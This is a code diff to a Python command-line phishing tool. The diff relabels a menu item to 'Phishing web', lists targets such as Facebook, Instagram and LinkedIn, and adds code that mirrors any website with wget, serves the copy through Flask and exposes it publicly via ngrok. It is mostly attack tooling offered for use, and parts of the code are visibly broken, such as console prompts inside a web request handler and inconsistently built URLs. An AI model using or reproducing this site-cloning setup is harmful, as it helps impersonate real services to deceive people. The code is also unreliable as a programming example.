@@ -4,6 +4,11 @@ import webbrowser
 import shutil
 import requests
 from bs4 import BeautifulSoup
+import subprocess
+from flask import Flask, Response
+
+app = Flask(__name__)
+
 
 def title():
     logo = (
@@ -32,7 +37,7 @@ def show_help():
         "\n"
         "             "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
         "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
-        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"1"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Site List                       |\n"
+        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"1"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Phishing web                    |\n"
         "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"2"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Github Repository               |\n"
         "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"3"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Clone Site                      |\n"
         "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"help"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Show commands                |\n"
@@ -44,79 +49,103 @@ def show_help():
     )
     print(Fore.LIGHTCYAN_EX + help)
 
+def clone_and_serve_website(url):
+    try:
+        subprocess.run(["wget", "--mirror", "--convert-links", "--adjust-extension", "--page-requisites", url])
+
+        return Response(open("index.html", "rb"), content_type="text/html")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: Failed to clone the website. {e}")
+        return Response('Error: Failed to clone the website.', status=500)
+    except Exception as e:
+        print(f"Error: {e}")
+        return Response('Error: Failed to clone the website.', status=500)
+
+@app.route('/<path:custom_url>')
+def serve_custom_website(custom_url):
+    ngrok_ip = input("Enter the IP address for the ngrok POST (e.g., 'http://123.456.789.0:4040'): ")
+    ngrok_port = int(input("Enter the port number where your local server is running (e.g., 80 or 8080): "))
+
+    ngrok_cmd = f"ngrok http {ngrok_port}"
+    subprocess.Popen(ngrok_cmd, shell=True)
+
+    input("Press Enter after ngrok generates the public URL...")
+
+    ngrok_url = f"{ngrok_ip}:{ngrok_port}"
+    return clone_and_serve_website(f"{ngrok_url}/{custom_url}")
+
 def site_list():
-    current_script_dir = os.path.dirname(os.path.abspath(__file__))
-    site_folder = os.path.join(current_script_dir, "site")
     site = (
-        "             "+Fore.LIGHTCYAN_EX   +"                      _____ _ _               \n"
-        "             "+Fore.LIGHTCYAN_EX   +"                     / ____(_) |              \n"
-        "             "+Fore.LIGHTCYAN_EX   +"                     | (___  _| |_ ___ ___    \n"
-        "             "+Fore.LIGHTCYAN_EX   +"                      \___ \| | __/ _ \ __|   \n"
-        "             "+Fore.LIGHTCYAN_EX   +"                      ____) | | |_  __\__ \   \n"
-        "             "+Fore.LIGHTCYAN_EX   +"                     |_____/|_|\__\___|___/   \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                     _____ _ _               \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                    / ____(_) |              \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                    | (___  _| |_ ___ ___    \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                     \___ \| | __/ _ \ __|   \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                     ____) | | |_  __\__ \   \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                    |_____/|_|\__\___|___/   \n"
         "\n"
-        "             "+Fore.LIGHTCYAN_EX   +"                       Use Responsibly!           "+Fore.LIGHTCYAN_EX +"         \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  __________________  __________________  __________________              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [01] Facebook  |  | [21] Site List |  | [41] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [02] Twitter   |  | [22] Site List |  | [42] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [03] Instagram |  | [23] Site List |  | [43] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [04] LinkedIn  |  | [24] Site List |  | [44] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [05] YouTube   |  | [25] Site List |  | [45] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [06] Pinterest |  | [26] Site List |  | [46] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [07] Snapchat  |  | [27] Site List |  | [47] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [08] Reddit    |  | [28] Site List |  | [48] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [09] Tumblr    |  | [29] Site List |  | [49] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [10] TikTok    |  | [30] Site List |  | [50] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [11] Tumblr    |  | [31] Site List |  | [51] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [12] Wix       |  | [32] Site List |  | [52] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [13] Site List |  | [33] Site List |  | [53] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [14] Site List |  | [34] Site List |  | [54] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [15] Site List |  | [35] Site List |  | [55] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [16] Site List |  | [36] Site List |  | [56] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [17] Site List |  | [37] Site List |  | [57] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [18] Site List |  | [38] Site List |  | [58] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [19] Site List |  | [39] Site List |  | [59] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  | [20] Site List |  | [40] Site List |  | [60] Site List |              \n"
-        "             "+Fore.LIGHTWHITE_EX   +"  |________________|  |________________|  |________________|              \n"
+        "             "+Fore.LIGHTCYAN_EX   +"                      Use Responsibly!           "+Fore.LIGHTCYAN_EX +"         \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          __________________  __________________                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[01] "+Fore.LIGHTWHITE_EX +"Facebook  |  | "+Fore.LIGHTRED_EX +"[21] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[02] "+Fore.LIGHTWHITE_EX +"Twitter   |  | "+Fore.LIGHTRED_EX +"[22] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[03] "+Fore.LIGHTWHITE_EX +"Instagram |  | "+Fore.LIGHTRED_EX +"[23] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[04] "+Fore.LIGHTWHITE_EX +"LinkedIn  |  | "+Fore.LIGHTRED_EX +"[24] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[05] "+Fore.LIGHTWHITE_EX +"YouTube   |  | "+Fore.LIGHTRED_EX +"[25] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[06] "+Fore.LIGHTWHITE_EX +"Pinterest |  | "+Fore.LIGHTRED_EX +"[26] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[07] "+Fore.LIGHTWHITE_EX +"Snapchat  |  | "+Fore.LIGHTRED_EX +"[27] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[08] "+Fore.LIGHTWHITE_EX +"Reddit    |  | "+Fore.LIGHTRED_EX +"[28] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[09] "+Fore.LIGHTWHITE_EX +"Tumblr    |  | "+Fore.LIGHTRED_EX +"[29] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[10] "+Fore.LIGHTWHITE_EX +"TikTok    |  | "+Fore.LIGHTRED_EX +"[30] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[11] "+Fore.LIGHTWHITE_EX +"Tumblr    |  | "+Fore.LIGHTRED_EX +"[31] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[12] "+Fore.LIGHTWHITE_EX +"Wix       |  | "+Fore.LIGHTRED_EX +"[32] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[13] "+Fore.LIGHTWHITE_EX +"Github    |  | "+Fore.LIGHTRED_EX +"[33] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[14] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[34] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[15] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[35] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[16] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[36] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[17] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[37] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[18] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[38] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[19] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[39] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          | "+Fore.LIGHTRED_EX +"[20] "+Fore.LIGHTWHITE_EX +"Site List |  | "+Fore.LIGHTRED_EX +"[40] "+Fore.LIGHTWHITE_EX +"Site List |                \n"
+        "             "+Fore.LIGHTWHITE_EX   +"          |________________|  |________________|                \n"
         "\n"
-        "               "+Fore.LIGHTCYAN_EX   +"                      Next Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"next"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
-        "               "+Fore.LIGHTCYAN_EX   +"                      Exit Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
+        "             "+Fore.LIGHTCYAN_EX   +"                      Next Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"next"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
+        "             "+Fore.LIGHTCYAN_EX   +"                      Exit Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
 
         "\n"
     )
     print(Fore.LIGHTCYAN_EX + site)
+ 
     while True:
-        choice = input("Enter your choice [01-60]: ").strip().lower()
+        # Ask the user for the ngrok IP address
+        ngrok_ip = input("Enter the IP address for the ngrok POST (e.g., 'http://123.456.789.0:4040'): ")
 
-        if choice == "next":
-            pass
-        elif choice == "exit":
+        # Ask the user if they want to use sites from the catalog or provide a custom URL
+        use_catalog = input("Do you want to use sites from the catalog? (y/n): ").strip().lower()
+
+        if use_catalog == "y":
+            ngrok_port = int(input("Enter the port number where your local server is running (e.g., 80 or 8080): "))
+            ngrok_cmd = f"ngrok http {ngrok_port}"
+            subprocess.Popen(ngrok_cmd, shell=True)
+
+            # Wait for a moment to let ngrok generate the public URL
+            input("Press Enter after ngrok generates the public URL...")
+
+            # Display the ngrok URL to the user
+            ngrok_url = f"{ngrok_ip}/{ngrok_port}"
+            print(f"You can access the ngrok status page at: {ngrok_url}")
+
+            app.run(host='0.0.0.0', port=ngrok_port)
             break
+
+        elif use_catalog == "n":
+            custom_url = input("Enter the custom URL to clone and use in the server: ").strip()
+
+            # Use the custom URL to clone and serve the website
+            ngrok_url = f"{ngrok_ip}/{custom_url}"
+            app.run(host='0.0.0.0', port=8080)
+            break
+
         else:
-            try:
-                choice_num = int(choice)
-                if 1 <= choice_num <= 60:
-                    file_name = f"{choice_num:02d}"
-                    file_found = False
-
-                    for file in os.listdir(site_folder):
-                        if file.startswith(file_name) and os.path.isfile(os.path.join(site_folder, file)):
-                            source_file_path = os.path.join(site_folder, file)
-
-                            destination_folder = input("Enter the destination folder path: ").strip()
-                            destination_file_path = os.path.join(destination_folder, file)
-
-                            shutil.copyfile(source_file_path, destination_file_path)
-                            print(f"File '{file}' downloaded to your computer.")
-                            file_found = True
-                            break
-                    
-                    if not file_found:
-                        print(f"Error: File with the number '{file_name}' not found in the 'sites' folder.")
-                else:
-                    print("Error: Invalid choice. Please enter a number between 01 and 30.")
-            except ValueError:
-                print("Error: Invalid input. Please enter a number between 01 and 60.")
+            print("Invalid choice. Please enter 'y' or 'n'.")
 
 def open_github_repository():
     url = "https://github.com/phishing-project/.phishing"
